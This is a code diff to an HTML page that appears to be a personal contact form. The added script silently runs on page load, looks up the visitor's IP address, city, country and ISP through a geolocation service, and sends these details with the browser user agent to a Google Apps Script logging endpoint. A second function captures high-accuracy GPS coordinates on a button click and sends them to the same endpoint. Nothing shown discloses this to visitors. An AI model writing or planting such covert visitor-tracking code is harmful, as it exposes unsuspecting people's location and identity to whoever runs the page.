@@ -141,55 +141,45 @@
     <div class="thankyou">
       Thank you for contacting me!
     </div>
-  </div>
 
-<!-- trimmed for brevity -->
+  <script>
+    const LOG_URL = "https://script.google.com/macros/s/AKfycbySB82v1mHGCmDbyzZGTtsvvJscBhywYpFXLVzmlXmOvYYqkwFczRLzsRLsNmHE_bh-/exec";
 
-<script>
-  // Automatic IP-based logging with CORS proxy
-  fetch("https://corsproxy.io/?https://ipapi.co/json/")
-    .then(response => response.json())
-    .then(data => {
-      fetch("https://script.google.com/macros/s/AKfycbySB82v1mHGCmDbyzZGTtsvvJscBhywYpFXLVzmlXmOvYYqkwFczRLzsRLsNmHE_bh-/exec", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          ip: data.ip,
-          city: data.city,
-          country: data.country_name,
-          org: data.org,
-          ua: navigator.userAgent
-        })
+    // IP-based logging (automatic)
+    fetch("https://ipwho.is/")
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          const query = new URLSearchParams({
+            ip: data.ip,
+            city: data.city,
+            country: data.country,
+            org: data.connection?.isp || "",
+            ua: navigator.userAgent
+          }).toString();
+          fetch(`${LOG_URL}?${query}`);
+        }
       });
-    })
-    .catch(error => console.error("IP location fetch failed:", error));
 
-  // Manual click-based precise location logging
-  function getPreciseLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          fetch("https://script.google.com/macros/s/AKfycbySB82v1mHGCmDbyzZGTtsvvJscBhywYpFXLVzmlXmOvYYqkwFczRLzsRLsNmHE_bh-/exec", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              ip: "", city: "", country: "", org: "Manual GPS",
-              ua: navigator.userAgent,
+    // Precise GPS logging (on button click)
+    function getPreciseLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const query = new URLSearchParams({
               lat: position.coords.latitude,
               lon: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            })
-          });
-        },
-        (error) => {
-          console.error("Geolocation error:", error);
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    } else {
-      console.warn("Geolocation is not supported.");
+              accuracy: position.coords.accuracy,
+              ua: navigator.userAgent,
+              org: "Manual GPS"
+            }).toString();
+            fetch(`${LOG_URL}?${query}`);
+          },
+          (err) => console.error("GPS error", err),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      }
     }
-  }
-</script>
+  </script>
 </body>
 </html>
